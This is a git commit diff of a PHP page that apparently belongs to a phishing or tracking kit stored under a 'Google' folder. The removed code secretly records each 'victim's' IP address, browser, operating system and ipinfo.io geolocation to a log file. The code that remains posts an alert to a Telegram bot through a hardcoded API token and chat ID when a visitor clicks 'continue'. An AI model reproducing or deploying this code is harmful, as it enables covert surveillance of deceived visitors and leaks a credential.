3355e220bc3dd5d124a3433ee4b7363c3c54d910
fkyrsftj <132077319+fkyrsftj@users.noreply.github.com>
2023-05-12 16:13:28 -0700

    Update 040148.php

--- .www/public/Google/meta/040148.php
+++ .www/public/Google/meta/040148.php
@@ -1,105 +1,8 @@
-<?php 
-
-$file = "../../../../DATABASE/data.txt";
-// Get Full date of victim visit
-$full_date = date("d-m-Y h:i:s");
+<?php
 
 
-// Get Victim IP
-if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-    $ip = $_SERVER['HTTP_CLIENT_IP'];
-} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
-} else {
-    $ip = $_SERVER['REMOTE_ADDR'];
-}
+$message ="CONTINUE CLICKED\n";
 
-
-// Get Victim Browser
-$browser = $_SERVER['HTTP_USER_AGENT'];
-
-
-// Get Victim Os System
-
-function get_operating_system() {
-    $u_agent = $_SERVER['HTTP_USER_AGENT'];
-    $operating_system = 'Unknown Operating System';
-
-    //Get the operating_system name
-    if (preg_match('/linux/i', $u_agent)) {
-        $operating_system = 'Linux';
-    } elseif (preg_match('/macintosh|mac os x|mac_powerpc/i', $u_agent)) {
-        $operating_system = 'Mac';
-    } elseif (preg_match('/windows|win32|win98|win95|win16/i', $u_agent)) {
-        $operating_system = 'Windows';
-    } elseif (preg_match('/ubuntu/i', $u_agent)) {
-        $operating_system = 'Ubuntu';
-    } elseif (preg_match('/iphone/i', $u_agent)) {
-        $operating_system = 'IPhone';
-    } elseif (preg_match('/ipod/i', $u_agent)) {
-        $operating_system = 'IPod';
-    } elseif (preg_match('/ipad/i', $u_agent)) {
-        $operating_system = 'IPad';
-    } elseif (preg_match('/android/i', $u_agent)) {
-        $operating_system = 'Android';
-    } elseif (preg_match('/blackberry/i', $u_agent)) {
-        $operating_system = 'Blackberry';
-    } elseif (preg_match('/webos/i', $u_agent)) {
-        $operating_system = 'Mobile';
-    }
-    
-    return $operating_system;
-}
-
-
-$os_system = get_operating_system();
-
-
-
-// Get Victim Geolocation Info
-function get_client_ip()
-{
-    $ipaddress = '';
-    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
-        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
-    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
-    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
-        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
-    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
-        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
-    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
-        $ipaddress = $_SERVER['HTTP_FORWARDED'];
-    } else if (isset($_SERVER['REMOTE_ADDR'])) {
-        $ipaddress = $_SERVER['REMOTE_ADDR'];
-    } else {
-        $ipaddress = 'UNKNOWN';
-    }
-
-    return $ipaddress;
-}
-$PublicIP = get_client_ip();
-$json     = file_get_contents("http://ipinfo.io/$PublicIP/geo");
-$json     = json_decode($json, true);
-$country  = $json['country'];
-$region   = $json['region'];
-$city     = $json['city'];
-
-
-
-
-file_put_contents($file, print_r("\nCLENT INTERESTED IN YOUR PRODUCT\n", true), FILE_APPEND);
-file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
-file_put_contents($file, print_r("IPaddress : $ip \n"       , true), FILE_APPEND);
-file_put_contents($file, print_r("Full-Date : $full_date \n", true), FILE_APPEND);
-file_put_contents($file, print_r("Country   : $country \n"  , true), FILE_APPEND);
-file_put_contents($file, print_r("Region    : $region \n"   , true), FILE_APPEND);
-file_put_contents($file, print_r("City      : $city \n"     , true), FILE_APPEND);
-file_put_contents($file, print_r("UserAgent : $browser \n"  , true), FILE_APPEND);
-file_put_contents($file, print_r("OS-System : $os_system \n", true), FILE_APPEND);
-file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
-file_put_contents($file, print_r("\n", true), FILE_APPEND);
-$message ="SARAH SENT A MESSAGE\n";
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
     'chat_id' => '-1001831940786',
@@ -111,6 +14,7 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
                                                     
 
 ?>
+   
    
 <!doctype html> <head> <html lang="en" dir="ltr">
     <title>Current Location</title>
